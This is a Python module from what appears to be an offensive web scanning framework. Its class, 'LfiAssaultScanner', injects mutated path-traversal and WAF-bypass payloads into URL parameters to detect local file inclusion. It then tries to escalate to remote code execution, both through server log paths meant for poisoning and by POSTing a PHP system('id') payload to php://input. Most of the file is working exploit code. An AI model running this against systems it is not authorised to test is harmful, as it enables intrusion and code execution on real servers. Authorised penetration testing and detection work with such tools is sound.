from scan_engine.helpers.http_client import get_session
import json
import os
import concurrent.futures
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from scan_engine.helpers.mutator import PayloadMutator
from scan_engine.helpers.param_expander import ParamExpander
from core.models import db, Finding
from core.results_store import load_results

class LfiAssaultScanner:
    PAYLOAD_TELEMETRY_KEYS = (
        "payloads_planned",
        "payloads_attempted",
        "payloads_skipped",
        "payloads_succeeded",
        "payloads_errored",
    )

    """
    Phase 4: Matrix-Based LFI Assault.
    Replaces the basic lfi_scanner.py with a full mutation-based engine.
    """
    
    def __init__(self, output_dir=None, options=None):
        self.options = options
        if output_dir is None:
            from pathlib import Path
            BASE_DIR = Path(__file__).resolve().parents[2]
            DATA_DIR = BASE_DIR / "data" / "results" / "lfi"
            DATA_DIR.mkdir(parents=True, exist_ok=True)
            output_dir = str(DATA_DIR)
        self.output_dir = output_dir
        self.waf_matrix_path = "data/kb/waf_matrix.json"
        
        # Load WAF Matrix
        if os.path.exists(self.waf_matrix_path):
            with open(self.waf_matrix_path, "r") as f:
                self.matrix = json.load(f)
        else:
            self.matrix = []
            
        # Filter matrix for LFI rules
        self.lfi_rules = [r for r in self.matrix if "lfi" in r.get("tags", []) or "path_traversal" in r.get("tags", [])]

        # V12: Add Log Poisoning and Wrapper payloads to the mix
        self.rce_bridge_payloads = [
            "/var/log/apache2/access.log",
            "/var/log/nginx/access.log",
            "/var/log/httpd/access_log",
            "/var/log/auth.log",
            "php://input"
        ]
        self.last_telemetry = self._new_payload_telemetry()

    @classmethod
    def _new_payload_telemetry(cls):
        return {key: 0 for key in cls.PAYLOAD_TELEMETRY_KEYS}

    @classmethod
    def _merge_payload_telemetry(cls, base, overlay):
        merged = cls._new_payload_telemetry()
        for key in cls.PAYLOAD_TELEMETRY_KEYS:
            merged[key] = int((base or {}).get(key, 0) or 0) + int((overlay or {}).get(key, 0) or 0)
        return merged

    def scan(self, target, scan_id, urls=None, logger=None, finding_callback=None, quick=False):
        """
        Main entry point for LFI scanning.
        """
        if logger: logger(f"LFI Assault: Starting Matrix Attack on {target} (Mode: {'Quick' if quick else 'Full'})", "INFO")
        
        # 1. Discover Parameters & Expand Surface
        urls_to_test = [target]
        
        # Add provided URLs (from Katana/FFUF)
        if urls:
            # Sort URLs to prioritize more interesting ones (with params or high depth)
            urls = sorted(urls, key=lambda x: (len(urlparse(x).query) > 0, urlparse(x).path.count('/')), reverse=True)
            
            if quick:
                # Limit surface in quick mode
                urls = urls[:15]
                if logger: logger(f"LFI Assault: (Quick Mode) Capping scan to top {len(urls)} target URLs", "DEBUG")
            else:
                if logger: logger(f"LFI Assault: (Exhaustive) Processing all {len(urls)} target URLs", "INFO")
            
            urls_to_test.extend(urls)
            
        # 2. Attack Execution
        findings = []
        aggregate_telemetry = self._new_payload_telemetry()
        
        # We process URLs in parallel threads
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            future_to_url = {executor.submit(self._assault_url, url, logger, quick): url for url in urls_to_test}
            for future in concurrent.futures.as_completed(future_to_url):
                url = future_to_url[future]
                try:
                    url_findings, url_telemetry = future.result()
                    aggregate_telemetry = self._merge_payload_telemetry(aggregate_telemetry, url_telemetry)
                    if url_findings:
                        for f in url_findings:
                            if finding_callback:
                                finding_callback(
                                    title=f.get('title'),
                                    description=f.get('description'),
                                    severity=f.get('severity'),
                                    tool_source="LfiAssault",
                                    raw_loot=url
                                )
                            findings.append(f)
                except Exception as e:
                    if logger: logger(f"LFI Error on {url}: {e}", "ERROR")

        self.last_telemetry = aggregate_telemetry
        if logger:
            logger(
                f"LFI Assault telemetry: {json.dumps(aggregate_telemetry, sort_keys=True)}",
                "DEBUG",
            )
        if logger: logger(f"LFI Assault: Finished. Found {len(findings)} issues.", "SUCCESS")
        return findings


    def _assault_url(self, url, logger, quick=False):
        """
        Performs the matrix attack on a single base URL.
        """
        findings = []
        telemetry = self._new_payload_telemetry()
        target_urls_with_points = []
        
        # 1. Existing params
        parsed = urlparse(url)
        qs = parse_qs(parsed.query)
        if qs:
            for param in qs:
                target_urls_with_points.append((url, param))
        
        # 2. Expanded params
        # In quick mode/deep 1, only expand if NO params exist at all, otherwise skip expansion to save time
        if not target_urls_with_points or not quick:
            expanded_urls = ParamExpander.expand(url, attack_type="lfi")
            for e_url in expanded_urls:
                e_qs = parse_qs(urlparse(e_url).query)
                for p, v in e_qs.items():
                    if v == ['FUZZ']:
                        target_urls_with_points.append((e_url, p))
                        if quick: break # Only one expanded param in quick mode
        
        if not quick:
             target_urls_with_points = list(set(target_urls_with_points)) # No cap in exhaustive mode
        else:
             target_urls_with_points = list(set(target_urls_with_points))[:10] # Cap injection points in quick mode
        
        session = get_session(self.options)
        session.headers.update({"User-Agent": "RedOps3-Assault/1.0"})
        
        # 0. Baseline fetch to avoid false positives (e.g. Mapbox case)
        baselines = {}
        for target_url, param in target_urls_with_points[:5]: # Baseline first few URLs
             if target_url not in baselines:
                 try:
                     b_resp = session.get(target_url, timeout=3, verify=False)
                     baselines[target_url] = b_resp.text if b_resp.status_code == 200 else ""
                 except: baselines[target_url] = ""

        # Phase 1: Matrix Rules
        matrix_attempts = []
        for rule in self.lfi_rules:
            # In quick mode, only test first 3 payloads per rule
            payloads_to_test = rule.get("payloads", [])
            if quick:
                payloads_to_test = payloads_to_test[:3]

            for base_payload in payloads_to_test:
                # Apply mutations
                rule_mutations = rule.get("mutations")
                if quick:
                    rule_mutations = [m for m in rule_mutations if m in ["url_encode", "original"]]
                    if not rule_mutations:
                        rule_mutations = ["original"]

                mutations = PayloadMutator.mutate(base_payload, rule_mutations)

                for payload in mutations:
                    for target_url, param in target_urls_with_points:
                        matrix_attempts.append(
                            {
                                "rule": rule,
                                "target_url": target_url,
                                "param": param,
                                "payload": payload,
                                "final_url": self._inject(target_url, param, payload),
                            }
                        )

        telemetry["payloads_planned"] += len(matrix_attempts)
        for index, attempt in enumerate(matrix_attempts):
            telemetry["payloads_attempted"] += 1
            try:
                resp = session.get(attempt["final_url"], timeout=3, verify=False)
                baseline_text = baselines.get(attempt["target_url"], "")

                # CRITICAL: Verify success AND check that it's NOT in the baseline
                if self._check_success(resp, attempt["rule"], baseline_text=baseline_text):
                    from scan_engine.helpers.finding_normalizer import FindingNormalizer
                    telemetry["payloads_succeeded"] += 1
                    findings.append(FindingNormalizer.from_response(
                        resp,
                        title=f"Local File Inclusion (LFI) - {attempt['rule']['rule_id']}",
                        severity="critical",
                        confidence="high",
                        description=(
                            "Confirmed Local File Inclusion via differential analysis.\n"
                            f"URL: {attempt['final_url']}\n"
                            f"Payload: {attempt['payload']}\n"
                            f"Confirmed using rule: {attempt['rule']['rule_id']}"
                        ),
                        tool_source="lfi_assault",
                        category="lfi",
                        payload=attempt["payload"],
                        method="GET",
                        metadata={
                            "rule_id": attempt["rule"]["rule_id"],
                            "bypass_technique": "mutation_matrix"
                        }
                    ))
                    telemetry["payloads_skipped"] += len(matrix_attempts) - index - 1
                    break
            except Exception:
                telemetry["payloads_errored"] += 1
                pass

        # Phase 2: RCE Bridge Escalation (V12 Ultimate - Log Poisoning & php://input)
        if findings or not quick:
            bridge_targets = target_urls_with_points[:5]
            for target_url, param in bridge_targets:
                for bridge_payload in self.rce_bridge_payloads:
                    telemetry["payloads_planned"] += 2 if "php://input" in bridge_payload else 1

            for target_url, param in bridge_targets:
                for bridge_payload in self.rce_bridge_payloads:
                    final_url = self._inject(target_url, param, bridge_payload)
                    try:
                        telemetry["payloads_attempted"] += 1
                        resp = session.get(final_url, timeout=3, verify=False)
                        
                        # 1. Check if we can read logs or trigger wrapper
                        is_log = "log" in bridge_payload
                        is_php_input = "php://input" in bridge_payload
                        
                        success = False
                        escalation_type = None
                        
                        if is_log and ("root:x:0:0:" in resp.text or "[extensions]" in resp.text or "apache" in resp.text.lower()):
                            success = True
                            escalation_type = "Log Poisoning Candidate"
                        
                        if is_php_input:
                            # Attempt RCE verification via POST
                            telemetry["payloads_attempted"] += 1
                            r_rce = session.post(final_url, data="<?php system('id'); ?>", timeout=5, verify=False)
                            if "uid=" in r_rce.text:
                                success = True
                                escalation_type = "RCE via php://input"
                        
                        if success:
                            telemetry["payloads_succeeded"] += 1
                            from scan_engine.helpers.finding_normalizer import FindingNormalizer
                            findings.append(FindingNormalizer.from_response(
                                r_rce if is_php_input else resp,
                                title=f"LFI Escalation: {escalation_type}",
                                severity="critical",
                                confidence="certain",
                                description=f"Successfully escalated LFI to {escalation_type}.\nURL: {final_url}\nPayload: {bridge_payload}",
                                tool_source="lfi_assault_rce",
                                category="rce",
                                payload=bridge_payload,
                                method="POST" if is_php_input else "GET"
                            ))
                    except:
                        telemetry["payloads_errored"] += 1
                        pass
                            
        return findings, telemetry

    def _inject(self, url, param, payload):
        parsed = urlparse(url)
        qs = parse_qs(parsed.query)
        
        # If param value was FUZZ, replace it. Else replace existing value.
        qs[param] = payload
        
        new_query = urlencode(qs, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def _check_success(self, resp, rule, baseline_text=""):
        """
        Verifies if the attack succeeded based on the rule's check_type.
        Includes differential check against baseline and auto-decoding for wrappers.
        """
        if resp.status_code != 200:
            return False
            
        check_type = rule.get("check_type")
        keywords = rule.get("match_keywords", [])
        content = resp.text
        
        # Wave 5: High-fidelity PHP Wrapper Verification
        # If the content looks like base64 and we test a PHP filter, try to decode it
        if len(content) > 10 and re.match(r'^[a-zA-Z0-9+/=]+$', content.strip()):
            try:
                import base64
                decoded = base64.b64decode(content.strip()).decode('utf-8', errors='ignore')
                if decoded:
                    content = decoded
            except:
                pass

        if check_type == "keyword_match":
            for kw in keywords:
                # Signature must be present in content AND NOT in baseline
                if kw in content and kw not in baseline_text:
                    return True
        
        return False
